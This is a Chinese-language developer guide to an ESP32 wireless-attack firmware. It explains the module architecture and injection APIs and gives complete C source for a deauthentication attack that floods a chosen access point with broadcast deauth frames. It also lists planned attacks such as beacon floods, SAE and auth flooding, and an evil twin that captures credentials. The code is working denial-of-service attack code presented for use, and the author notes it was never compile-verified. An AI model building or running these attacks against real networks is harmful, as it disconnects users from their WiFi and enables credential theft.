# 怎么给这个固件加一种新攻击

写给已经会 C、但还没在这个工程里动过手的人。全文以仓库现状为准，接口签名都能在
`components/` 里找到对应头文件。

**先说清楚一件事**：本文的接口签名是从代码里抄的，但第三节那个示例攻击**没有编译验证过**
——它是一份骨架，`TODO` 那几处必须你自己填。能验证的地方我都标了命令行。

---

## 一、先看懂这张图

```
            serial（串口行协议）        wireless_ui（LVGL 屏）     以后：TCP/JSON
                      \                      |                      /
                       \                     |                     /
   transport  ──────────┴────────────────────┴────────────────────┘  只是一堆客户端
                                  |
                                  v
   wbus  ──  对象注册表 + 参数策略 + 方法调用 + 事件广播
                                  |
              ┌───────────────────┴───────────────────┐
              |                                       |
        services（system/ui/radio/scan/monitor）   attacks（← 你要加的东西）
              |                                       |
              └───────────────────┬───────────────────┘
                                  |
   wtarget（目标表 AP/STA）   wifi_frame（组帧/解析）  ←── 纯逻辑，可以在主机上跑
                                  |
                              hal_wifi  ←── 全工程唯一允许调 esp_wifi_* 的地方
                                  |
                              platform（UART/LCD/NVS/GPIO）
```

三条铁律，先记住：

1. **只有 `hal_wifi` 能碰 `esp_wifi_*`**。别的地方出现 `esp_wifi_` 就是越界。
2. **只有 `wifi_frame` 能拼字节**。攻击模块里不该出现 `buf[0] = 0xC0` 这种。
3. **攻击模块不打印**。要输出就 `wb_reply_line()`（回给调用方）或 `wb_emit()`（事件）。

---

## 二、一个攻击 = 一个对象 + 一张驱动表

`components/attacks/include/attacks/attack.h` 就是全部契约：

```c
struct attack_driver {
    const char *name;                        // "deauth"，给 attack_find 用
    const wb_object_t *object;               // 总线对象：方法、参数、帮助
    esp_err_t (*start)(wb_args_t *args);     // 由对象的 start 方法调用
    void (*stop)(void);
    void (*tick)(uint32_t now_ms);           // 主循环每 50ms 调一次，仅 active 时
    uint32_t (*frames)(void);                // 已发帧数，给 STATUS 用
    bool (*active)(void);
};
```

`attack_register(&driver)` 干两件事：把驱动存进表，顺手 `wb_register(driver->object)`。
所以**注册一次，串口命令、`DESCRIBE`、事件订阅全都自动有了**，你不用碰
`serial_console` 之类的地方——这个工程里根本没有那种上帝文件。

主循环在 `main/main.c`：

```c
for (;;) {
    services_tick(now);    // 信道租约到期、扫描步进
    attacks_tick(now);     // 遍历所有 active 的攻击，调它的 tick
    vTaskDelay(pdMS_TO_TICKS(50));
}
```

周期 50 ms。所以 `tick()` 里做一次动作，天然就是 20 Hz 的节奏——和单播 45 ms 的限速
刚好合拍。

---

## 三、七步加进去

以加一个 `deauth` 为例。目录结构按 `components/attacks/README.md` 的约定：

```
components/attacks/deauth/
├── deauth.c          行为、节拍、计数
└── deauth_object.c   总线对象：方法表、参数策略、回执
```

### 第 1 步：写对象（`deauth_object.c`）

参数策略是 wbus 的糖：声明式校验，`wb_call` 自动执行，失败时统一生成
`ERR deauth.start: reason must be 1..65535` 这种文案，不用你自己写 if。

```c
#include "attacks/attack.h"
#include "wbus/wbus.h"
#include "deauth.h"          // 你自己的头文件，暴露 deauth_start/deauth_stop

static const wb_policy_t kStartPolicy[] = {
    {.name = "idx",    .type = WB_T_IDX, .required = true},                 // 复用目标表下标
    {.name = "reason", .type = WB_T_U32, .required = false, .min = 1, .max = 65535, .def = 7},
    {.name = "burst",  .type = WB_T_U32, .required = false, .min = 1, .max = 16,    .def = 4},
};

static esp_err_t deauth_m_start(wb_args_t *args, wb_reply_t *reply) {
    const esp_err_t err = deauth_start(args);
    if (err != ESP_OK) {
        wb_reply_fail(reply, "start failed (%s)", esp_err_to_name(err));
        return err;
    }
    wb_reply_line(reply, "deauth on idx=%u reason=%u",
                  (unsigned)wb_args_u32(args, "idx"), (unsigned)wb_args_u32(args, "reason"));
    return ESP_OK;
}

static esp_err_t deauth_m_stop(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    deauth_stop();
    wb_reply_line(reply, "deauth off frames=%u", (unsigned)deauth_frames());
    return ESP_OK;
}

static const wb_method_t kMethods[] = {
    {"start", deauth_m_start, "idx=1..64 [reason=1..65535] [burst=1..16]", kStartPolicy, 3},
    {"stop",  deauth_m_stop,  "",                                          NULL,          0},
};

static const wb_object_t kObject = {
    .name = "deauth",
    .methods = kMethods,
    .n_methods = sizeof(kMethods) / sizeof(kMethods[0]),
};

const wb_object_t *attacks_deauth_object(void) { return &kObject; }
```

注意 `{... , kStartPolicy, 3}` 最后那个 `3` 是参数个数，**写错了不会报错，只会让多余参数
被当成 "extra is not a parameter of start"**。加参数记得同步改这个数。

### 第 2 步：写行为（`deauth.c`）

```c
#include "attacks/attack.h"
#include "hal_wifi/hal_wifi.h"
#include "wifi_frame/frame_build.h"
#include "wtarget/wtarget.h"
#include "wbus/wbus.h"
#include "deauth.h"

static const wt_entry_t *s_target;
static uint16_t s_reason = 7;
static uint32_t s_burst = 4;
static uint32_t s_frames;
static uint32_t s_last_tx_ms;
static uint8_t s_frame[64];          // 26 字节的帧，64 够了

esp_err_t deauth_start(wb_args_t *args) {
    const uint32_t idx = wb_args_u32(args, "idx");
    s_target = wt_at(idx);
    if (s_target == NULL) {
        return ESP_ERR_INVALID_ARG;     // 目标表里没这个下标
    }
    s_reason = (uint16_t)wb_args_u32(args, "reason");
    s_burst = wb_args_u32(args, "burst");
    s_frames = 0;
    s_last_tx_ms = 0;

    // 钉住目标信道；owner 名字会被别的模块看见，起个能认出来的
    return hal_wifi_channel_acquire("deauth", HAL_CH_PINNED, s_target->channel, 0);
}

void deauth_stop(void) {
    hal_wifi_channel_release("deauth");
    s_target = NULL;
}

void deauth_tick(uint32_t now_ms) {
    if (s_target == NULL) {
        return;
    }
    if (s_last_tx_ms != 0 && (now_ms - s_last_tx_ms) < HAL_WIFI_UNICAST_GAP_MS) {
        return;                       // 让 HAL 的节流先过去，别硬撞
    }
    for (uint32_t i = 0; i < s_burst; i++) {
        // 广播用组播地址，单播填目标 STA —— 这里以广播为例
        const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        const int len = wf_build_deauth(s_frame, sizeof(s_frame), bcast, s_target->bssid,
                                        s_target->bssid, s_reason);
        if (len <= 0) {
            return;
        }
        const esp_err_t err = hal_wifi_tx(s_frame, (uint16_t)len);
        if (err == ESP_ERR_INVALID_STATE) {
            break;                    // 被 HAL 限速了，下一拍再来
        }
        if (err != ESP_OK) {
            return;
        }
        s_frames++;
    }
    s_last_tx_ms = now_ms;
}

uint32_t deauth_frames(void) { return s_frames; }
bool deauth_active(void) { return s_target != NULL; }
```

### 第 3 步：写驱动表并登记

```c
// deauth.c 末尾
extern const wb_object_t *attacks_deauth_object(void);

static const attack_driver_t kDeauth = {
    .name = "deauth",
    .object = NULL,                   // 见下：不能在这里写 attacks_deauth_object()
    .start = deauth_start,
    .stop = deauth_stop,
    .tick = deauth_tick,
    .frames = deauth_frames,
    .active = deauth_active,
};
```

`object` 是 `const wb_object_t *`，但静态初始化器里不能放函数调用。两种解法：

**A（推荐）** 在 `components/attacks/src/attacks.c` 里显式登记，跳过 `object` 字段：

```c
// attacks_start() 里
extern const wb_object_t *attacks_deauth_object(void);
extern const attack_driver_t *attacks_deauth_driver(void);
attack_register(attacks_deauth_driver());
```

**B** 让 `deauth.c` 导出一个函数，返回已经填好 `object` 的结构体：

```c
const attack_driver_t *attacks_deauth_driver(void) {
    static attack_driver_t driver = {
        .name = "deauth",
        .start = deauth_start,
        /* ... */
    };
    driver.object = attacks_deauth_object();
    return &driver;
}
```

### 第 4 步：改 `components/attacks/CMakeLists.txt`

现在只有一个源文件，变成：

```cmake
idf_component_register(
    SRCS
        "src/attacks.c"
        "deauth/deauth.c"
        "deauth/deauth_object.c"
    INCLUDE_DIRS "include" "deauth"
    REQUIRES wifi_frame hal_wifi wtarget wbus platform
)
```

`INCLUDE_DIRS` 加了 `deauth`，因为你 include 了 `"deauth.h"`。

### 第 5 步：编译

```powershell
# ESP32（带屏那块，COM5）
idf.py -B build build

# ESP32-C5（无屏，COM10）
idf.py -B build_c5 -D SDKCONFIG=sdkconfig.c5 -D IDF_TARGET=esp32c5 build
```

必须是 PowerShell 包装，Git Bash 直接跑 `idf.py` 会因 `MSYSTEM` 退出：

```powershell
Remove-Item Env:MSYSTEM -ErrorAction SilentlyContinue
& 'C:\Espressif\tools\Microsoft.v6.1.PowerShell_profile.ps1' | Out-Null
idf.py -B build build
```

### 第 6 步：手测

```text
DESCRIBE deauth                      # 看参数表是不是你写的
scan.listen dwell=1500               # 先攒目标表
scan.list
deauth.start idx=1 reason=7
radio.info                           # tx ok / err / throttled
deauth.stop
```

想确认帧真的出了空口，用第二块板（`monitor` 对象）或 C5，别只看自己返回 OK——
`ESP_OK` 只代表驱动收下了，不代表空口上有人听见。

### 第 7 步：加主机测试（可选但强烈建议）

`wifi_frame` 是不依赖 WiFi 的纯逻辑，能在 PC 上跑：

```bash
sh host_tests/run.sh      # 现在是 116 项，全绿才算没弄坏东西
```

如果你的攻击在 `wifi_frame` 里加了新构造器（比如某个特殊的 Action body），照着
`host_tests/test_frame.c` 加逐字节断言。攻击模块本身依赖 HAL，只能上板测。

---

## 四、你手上有什么武器

### 注入（`hal_wifi.h`）

| 接口 | 用途 | 坑 |
|---|---|---|
| `hal_wifi_tx(frame, len)` | 唯一注入点，10–1500 字节 | 返回 `ESP_ERR_INVALID_STATE` = 被限速，**不是失败**，下一拍重试 |
| `hal_wifi_mac(out)` | 本机 MAC | — |
| `hal_wifi_channel_acquire(owner, mode, ch, hold_ms)` | 占信道，`hold_ms=0` 表示不过期 | 被别人占了会失败，错误里带 owner |
| `hal_wifi_channel_select` / `release` / `tick` | 换信道 / 释放 / 由 `services_tick` 自动调 | — |
| `hal_wifi_tsf()` | 读硬件 TSF（µs） | 只读，改不了 |

限速是硬的：单播 45 ms、广播 20 ms，都是 `hal_wifi_tx` 内部挡，你挡不住也绕不过。
32 帧的池子打穿一次就是 `0x101` → 整片重启，没有恢复路径。

### 收包

```c
hal_wifi_rx_subscribe(fn, ctx);   // 最多 4 个订阅者，队列 8 深
hal_wifi_rx_set_filter(true, true, true);   // mgmt / ctrl / data
```

回调签名 `(frame, len, meta, ctx)`，`meta` 里有 `rssi / channel / rate_code / sig_mode /
mcs / sgi / timestamp`。**回调跑在 RX 任务里，别在里面发包、别 printf**——只拷贝入队。

`len` 是 `sig_len`，**含 4 字节 FCS**，真实帧长要减 4。

### 找目标

```c
hal_wifi_scan_blocking(dwell_ms);       // 主动扫描，结果在 hal_wifi_scan_at()
hal_wifi_sta_list(out, cap);            // 自动：起过 softAP 走 AP 表，否则走被动表
hal_wifi_sta_list_passive(out, cap);    // 混杂嗅到的（最多 32 个）
hal_wifi_sta_list_ap(out, cap);         // softAP 已关联的
```

高层的 `wtarget` 是目标表的正式存放处：`wt_add()` / `wt_at()` / `wt_select()` /
`wt_selected()`，64 项，`wt_entry_t` 里带 `sae` 和 `mfpr` 两个标志（WPA3 和强制 PMF
的判别结果），攻击模块靠它们决定走不走 SAE 路径。

### 组帧（`frame_build.h`）

全都返回帧长，失败返回 -1：

```c
wf_build_deauth / disassoc / auth / assoc_req / probe_req / beacon
wf_build_action            // category + body，CSA、BTM 都走这个
wf_build_data              // tods/fromds/qos 三个开关
wf_build_null_data         // qos=true 就是 QoS Null，唯一能上 HT 速率的载体
wf_build_llc_snap          // EAPOL 那一层
wf_build_bar / rts
```

### 解析（`ie_parse.h`）

```c
wf_ie_find(ies, len, id, &out_len)
wf_parse_beacon(frame, len, &bss)
wf_rsn_has_akm(rsn, len, WF_AKM_SAE)          // 判 WPA3
wf_rsn_mfpr_required(rsn, len)                // 判强制 PMF
wf_extcap_has_bss_transition(extcap, len)     // 判 BTM 支持，WNM 攻击的前置
wf_tim_parse / wf_tim_aid_set / wf_tim_is_multicast_set
wf_csa_parse(ie, len, &channel, &count)
```

### MAC 工具（`mac.h`）

`wf_mac_parse` / `wf_mac_format` / `wf_mac_randomize(out, entropy)` / `wf_mac_is_group` /
`wf_mac_is_broadcast`。随机 MAC 会置本地管理位，**不会**变成组播。

---

## 五、五条红线

1. **别直接调 `esp_wifi_*`**。绕开 `hal_wifi_tx` 就等于绕开了限速和 `0x101` 兜底，一次
   写错整板重启，而且 `STATUS` 里的计数对不上。
2. **别自己拼帧**。`wifi_frame` 的每一处字节都有主机断言守着（`host_tests/test_frame.c`），
   自己拼的没有。
3. **tick 里不要阻塞**。主循环 50 ms，你 delay 超过 50 ms 就把别的模块一起拖慢。
   需要长等待就记时间戳，下一拍再判断。
4. **不要在 RX 回调里发包**。历史结论：在 WiFi 任务的回调里连发 16 帧能直接把驱动
   TX 缓冲饿死（一半调用返回 `ESP_ERR_NO_MEM`）。要发就投个队列，回主循环发。
5. **大帧注意空中时间**。1500 字节 @1M 要占 12 ms 空口，比 26 字节的 deauth 长两个
   数量级。大帧洪泛对帧池的压力远超小帧，节奏要比平时更保守。

---

## 六、现有 12 个空目录，各自的难点

`components/attacks/` 下已经有目录占位，但**全是空壳**（只有 `.gitkeep`）。按难度排：

| 目录 | 依赖什么 | 真正的难点 |
|---|---|---|
| `deauth` | 单播 deauth + 目标表 | 没有，最适合当第一个 |
| `probe` | beacon / probe response 洪泛 | 帧长（带一堆 IE 会到 600+），广播限速 |
| `csa` | Action 帧 + beacon 克隆 | 要克隆真 AP 的 RSN IE，否则客户端不认 |
| `ba` / `delba` | BAR / DELBA Action | 20 字节控制帧，**以前被 RX 门槛整条丢过**，注意 `sig_len` 含 FCS |
| `wnm` | Action cat=10 act=7 + Ext Cap 判别 | 受害 STA 不支持 802.11v 就得跳过 |
| `tim` | beacon 克隆 + TIM IE | AID 从哪来（关联响应或按位图推算） |
| `eapol` | QoS data + LLC/SNAP(0x888E) | PSK 网络下 AP 可能根本不理，要做 bench |
| `pspoll` | PS-Poll 控制帧 + PM 位 | 效果边界大：AP 有缓存老化，不是永久阻断 |
| `sae` | Auth algo=3 + SAE Commit 元素 | 得先确认目标是 WPA3，否则白打 |
| `authflood` | Auth/Assoc 洪泛 + 随机 MAC | 要自己处理 AP 的拒绝和表项老化节奏 |
| `evil_twin` | `hal_wifi_ap_start` + 凭据捕获 | 用 `hal_wifi_sta_list_ap()` 看谁连上来，别用被动表 |

---

## 七、怎么验证才不算自欺欺人

这个工程踩过两次"自己发自己收自己算错"的坑，记下来：

1. **`ESP_OK` 不等于生效**。`esp_wifi_80211_tx` 返回成功只说明驱动收下了。
   一定要用第二块板（`monitor.start`）或 C5 看空口上有没有。
2. **收包侧自身的限制会伪装成发送失败**。曾经 RX 上限 512 字节，发 1478 的帧"发出去
   了但收不到"，差点误判成驱动拒绝。现在收发上限都对齐 1500，但换任何一侧都要同步。
3. **参数没解析和"设置无效"长得一模一样**。`radio.rate rate=mcs0` 曾经因为
   `parse_rate()` 没实现 mcs 分支而被当成 default，测出来"MCS 不支持"——其实压根没设进去。
   **判据**：看回执里回显的值，别只看 `OK`。

手边能用的验证工具（`firmware-v2/tools/`）：

| 脚本 | 干什么 |
|---|---|
| `selftest.py COM5` | 全命令回归：每个对象的正常路径 + 参数错误路径 |
| `aircheck.py COM5 COM6` | 跨板空口校验 |
| `ratecheck.py COM5 COM6 [--only ...]` | 28 档速率逐档核对 |
| `halcheck.py COM5 COM6` | 大帧 / 广播限速 / STA 表 |
| `htprobe.py COM5 COM6` | 30 秒判定 raw 路径有没有 HT |
| `aplist.py COM6` | STA 表三种来源的切换语义 |
| `bigframe_c5.py COM10 COM5` | 用 C5（另一套固件）做第三方 ground truth |
